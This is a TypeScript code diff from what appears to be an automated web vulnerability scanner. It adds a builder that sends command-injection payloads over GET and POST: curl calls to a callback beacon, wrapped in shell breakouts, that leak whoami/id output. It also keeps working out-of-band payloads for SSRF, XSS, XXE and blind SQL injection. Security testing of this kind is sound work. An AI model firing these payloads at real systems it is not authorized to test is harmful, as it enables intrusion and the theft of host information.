@@ -203,6 +203,57 @@ export const NUCLEI_TAGS_BY_CLASS: Record<string, string> = {
 // ceiling. "misconfig" alone loads ~624 templates and completes in ~10-15s.
 const NUCLEI_TAGS_FALLBACK = "misconfig";
 
+// ─── OOB-RCE injection vectors ────────────────────────────────────────────────
+// Real command injection usually EMBEDS a param inside a shell command, so the
+// payload needs a breakout prefix — not just a raw `curl <cb>`. We fan a bounded
+// set of (param × breakout) attempts, all pointing at ONE beacon, each tagged with
+// a `v=<vector>` marker so the callback tells us which one fired. whoami/id output
+// is folded into the callback query so the beacon captures WHO executed.
+const RCE_OOB_PARAMS = ["cmd", "exec", "command", "c", "ping", "host", "ip", "url", "query", "q", "data", "input"];
+const MAX_RCE_OOB_ATTEMPTS = 24;
+
+interface RceOobAttempt { method: "GET" | "POST"; url: string; body?: Record<string, string>; }
+
+/** Build a bounded set of OOB command-injection attempts against a target, across
+ *  common param names and shell-breakout contexts, GET + a few POST. Pure/testable. */
+export function buildRceOobAttempts(targetUrl: string, callbackUrl: string): RceOobAttempt[] {
+  // Each breakout wraps a callback that exfils whoami and tags the winning vector.
+  const cb = (v: string) => `${callbackUrl}?v=${v}&u=$(whoami)`;
+  const payloads: string[] = [
+    `curl ${cb("raw")}`,          // sink runs the value as a command
+    `; curl ${cb("semi")}`,       // ; breakout
+    `| curl ${cb("pipe")}`,       // | breakout
+    `&& curl ${cb("and")}`,       // && breakout
+    `$(curl ${cb("sub")})`,       // command substitution
+    "`curl " + cb("tick") + "`",  // backtick substitution
+    `\ncurl ${cb("nl")}`,         // newline breakout
+  ];
+
+  // Prefer params already present on the URL, then the RCE-common set; dedupe + cap.
+  const params = Array.from(new Set([
+    ...payloadMutator.findInjectableParams(targetUrl),
+    ...RCE_OOB_PARAMS,
+  ])).slice(0, 8);
+
+  // Reserve room for a few POST attempts so the GET burst can't consume the whole cap.
+  const postParams = params.slice(0, 3);
+  const getBudget = MAX_RCE_OOB_ATTEMPTS - postParams.length;
+
+  const attempts: RceOobAttempt[] = [];
+  for (const param of params) {
+    for (const payload of payloads) {
+      if (attempts.length >= getBudget) break;
+      attempts.push({ method: "GET", url: payloadMutator.injectPayload(targetUrl, param, payload) });
+    }
+    if (attempts.length >= getBudget) break;
+  }
+  // POST (JSON body) for the top params — many sinks are POST-only.
+  for (const param of postParams) {
+    attempts.push({ method: "POST", url: targetUrl, body: { [param]: `; curl ${cb("post-" + param)}` } });
+  }
+  return attempts.slice(0, MAX_RCE_OOB_ATTEMPTS);
+}
+
 // ─── Tool Knowledge System ────────────────────────────────────────────────────
 // Commands return { bin, args } arrays — never interpolated shell strings —
 // to prevent command injection via attacker-controlled URLs.
@@ -2778,42 +2829,42 @@ Return ONLY valid JSON array of hypothesis objects.`;
       const { beaconId, callbackUrl } = interactshBeacon ?? callbackServer.generateBeacon();
       const useInteractsh = Boolean(interactshBeacon);
 
-      // Inject callback URL as payload based on vuln class
-      const probeUrl = (() => {
-        const u = new URL(targetUrl);
-        if (vulnClass === "ssrf") {
-          u.searchParams.set("url", callbackUrl);
-          u.searchParams.set("dest", callbackUrl);
-          u.searchParams.set("target", callbackUrl);
-          return u.toString();
-        }
-        if (vulnClass === "xss") {
-          u.searchParams.set("q", `<img src="${callbackUrl}" onerror="fetch('${callbackUrl}')">`);
-          return u.toString();
-        }
-        if (vulnClass === "xxe") {
-          u.searchParams.set("xml", `<?xml version="1.0"?><!DOCTYPE x [<!ENTITY oob SYSTEM "${callbackUrl}">]><x>&oob;</x>`);
-          return u.toString();
-        }
-        if (vulnClass === "rce") {
-          // Fold command output into the callback query so the beacon captures WHO
-          // executed it — a stronger PoC than a bare ping. searchParams.set()
-          // URL-encodes the $()/spaces; the target's shell substitutes on execution.
-          u.searchParams.set("cmd", `curl ${callbackUrl}?u=$(whoami)`);
-          u.searchParams.set("exec", `curl ${callbackUrl}?i=$(id)`);
-          u.searchParams.set("c", `curl ${callbackUrl}?w=\`whoami\``);
-          return u.toString();
-        }
-        // sqli blind: time-based + OOB
-        u.searchParams.set("id", `1 AND LOAD_FILE('${callbackUrl}')-- -`);
-        return u.toString();
-      })();
+      const reqOpts = { headers: this.authHeaders, timeout: 8000, validateStatus: () => true };
 
-      await axios.get(probeUrl, {
-        headers: this.authHeaders,
-        timeout: 8000,
-        validateStatus: () => true,
-      }).catch(() => {});
+      if (vulnClass === "rce") {
+        // Fan a bounded multi-vector command-injection burst across common params and
+        // shell-breakout contexts (GET + a few POST), all pointing at the one beacon.
+        // Each payload folds whoami output + a vector marker into the callback.
+        const attempts = buildRceOobAttempts(targetUrl, callbackUrl);
+        await Promise.allSettled(attempts.map(a =>
+          a.method === "POST"
+            ? axios.post(a.url, a.body ?? {}, reqOpts)
+            : axios.get(a.url, reqOpts)
+        ));
+      } else {
+        // Single-request OOB payload for ssrf/xss/xxe/sqli.
+        const probeUrl = (() => {
+          const u = new URL(targetUrl);
+          if (vulnClass === "ssrf") {
+            u.searchParams.set("url", callbackUrl);
+            u.searchParams.set("dest", callbackUrl);
+            u.searchParams.set("target", callbackUrl);
+            return u.toString();
+          }
+          if (vulnClass === "xss") {
+            u.searchParams.set("q", `<img src="${callbackUrl}" onerror="fetch('${callbackUrl}')">`);
+            return u.toString();
+          }
+          if (vulnClass === "xxe") {
+            u.searchParams.set("xml", `<?xml version="1.0"?><!DOCTYPE x [<!ENTITY oob SYSTEM "${callbackUrl}">]><x>&oob;</x>`);
+            return u.toString();
+          }
+          // sqli blind: time-based + OOB
+          u.searchParams.set("id", `1 AND LOAD_FILE('${callbackUrl}')-- -`);
+          return u.toString();
+        })();
+        await axios.get(probeUrl, reqOpts).catch(() => {});
+      }
 
       // Interactsh gets more time since DNS propagation can add a few seconds
       const waitMs = useInteractsh ? 15_000 : 12_000;
@@ -2831,10 +2882,13 @@ Return ONLY valid JSON array of hypothesis objects.`;
       }
 
       // Build a human-readable summary of any captured command output.
+      // `v` is the winning injection vector marker (semi/pipe/sub/tick/…); surface it
+      // separately, then label the command-output keys (u=whoami, i=id).
       const LABELS: Record<string, string> = { u: "whoami", i: "id", w: "whoami" };
       const summary = exfil && Object.keys(exfil).length > 0
-        ? "OOB command output — " + Object.entries(exfil)
-            .map(([k, v]) => `${LABELS[k] ?? k}=${v}`).join(", ")
+        ? `OOB command output${exfil.v ? ` via ${exfil.v}` : ""} — ` + Object.entries(exfil)
+            .filter(([k]) => k !== "v")
+            .map(([k, val]) => `${LABELS[k] ?? k}=${val}`).join(", ")
         : undefined;
 
       if (hit) {
